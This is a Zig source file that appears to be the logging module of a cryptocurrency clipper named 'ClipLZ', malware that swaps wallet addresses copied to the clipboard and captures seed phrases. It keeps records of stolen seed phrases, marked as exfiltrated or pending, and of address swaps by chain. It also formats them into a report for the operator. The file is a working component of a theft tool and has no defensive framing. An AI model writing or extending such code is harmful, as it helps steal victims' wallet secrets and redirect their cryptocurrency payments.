const std = @import("std");
const scanner = @import("scanner.zig");

const MAX_SWAPS: usize = 128;
const MAX_SEEDS: usize = 32;

pub const SeedEntry = struct {
    timestamp: i64,
    phrase_preview: [32]u8,
    exfiltrated: bool,
};

pub const SwapEntry = struct {
    timestamp: i64,
    chain: scanner.Chain,
    original_prefix: [8]u8,
    original_suffix: [8]u8,
    format: []const u8,
};

pub const ClipperLog = struct {
    swap_entries: [MAX_SWAPS]SwapEntry = undefined,
    swap_count: usize = 0,
    seed_entries: [MAX_SEEDS]SeedEntry = undefined,
    seed_count: usize = 0,
    allocator: std.mem.Allocator,

    pub fn init(allocator: std.mem.Allocator) ClipperLog {
        return ClipperLog{ .allocator = allocator };
    }

    pub fn addSwap(self: *ClipperLog, record: SwapEntry) void {
        if (self.swap_count < MAX_SWAPS) {
            self.swap_entries[self.swap_count] = record;
            self.swap_count += 1;
        } else {
            var i: usize = 1;
            while (i < MAX_SWAPS) : (i += 1) {
                self.swap_entries[i - 1] = self.swap_entries[i];
            }
            self.swap_entries[MAX_SWAPS - 1] = record;
        }
    }

    pub fn addSeed(self: *ClipperLog, phrase: []const u8, exfiltrated: bool) void {
        if (self.seed_count < MAX_SEEDS) {
            var entry = SeedEntry{
                .timestamp = getTimestamp(),
                .phrase_preview = .{0} ** 32,
                .exfiltrated = exfiltrated,
            };
            const copy_len = @min(phrase.len, entry.phrase_preview.len);
            @memcpy(entry.phrase_preview[0..copy_len], phrase[0..copy_len]);
            self.seed_entries[self.seed_count] = entry;
            self.seed_count += 1;
        } else {
            var i: usize = 1;
            while (i < MAX_SEEDS) : (i += 1) {
                self.seed_entries[i - 1] = self.seed_entries[i];
            }
            var entry = SeedEntry{
                .timestamp = getTimestamp(),
                .phrase_preview = .{0} ** 32,
                .exfiltrated = exfiltrated,
            };
            const copy_len = @min(phrase.len, entry.phrase_preview.len);
            @memcpy(entry.phrase_preview[0..copy_len], phrase[0..copy_len]);
            self.seed_entries[MAX_SEEDS - 1] = entry;
        }
    }

    pub fn format(self: *ClipperLog, allocator: std.mem.Allocator) ![]u8 {
        var buf = std.ArrayList(u8).init(allocator);
        try buf.appendSlice("=== ClipLZ Log ===\n");

        if (self.seed_count > 0) {
            try buf.appendSlice("--- Seed Phrases ---\n");
            for (0..self.seed_count) |i| {
                const e = &self.seed_entries[i];
                try buf.appendSlice("  [Seed] ");
                try buf.appendSlice(e.phrase_preview[0..@min(32, 32)]);
                try buf.appendSlice(if (e.exfiltrated) " (exfiltrated)\n" else " (pending)\n");
            }
        }

        if (self.swap_count > 0) {
            try buf.appendSlice("--- Address Swaps ---\n");
            for (0..self.swap_count) |i| {
                const e = &self.swap_entries[i];
                try buf.appendSlice("  [Swap] ");
                try buf.appendSlice(e.chain.label());
                try buf.appendSlice(" ");
                try buf.appendSlice(e.original_prefix[0..8]);
                try buf.appendSlice("...");
                try buf.appendSlice(e.original_suffix[0..8]);
                try buf.appendSlice(" ");
                try buf.appendSlice(e.format);
                try buf.appendSlice("\n");
            }
        }

        if (self.seed_count == 0 and self.swap_count == 0) {
            try buf.appendSlice("  No clipper activity recorded.\n");
        }

        return buf.toOwnedSlice();
    }

    pub fn hasData(self: *const ClipperLog) bool {
        return self.seed_count > 0 or self.swap_count > 0;
    }

    pub fn reset(self: *ClipperLog) void {
        self.swap_count = 0;
        self.seed_count = 0;
    }
};

fn getTimestamp() i64 {
    // Returns Windows FILETIME (100-ns intervals since Jan 1, 1601)
    // Using a simple epoch fallback if NtQuerySystemTime is unavailable
    return @as(i64, @intCast(std.time.milliTimestamp())) * 10000 + 116444736000000000;
}
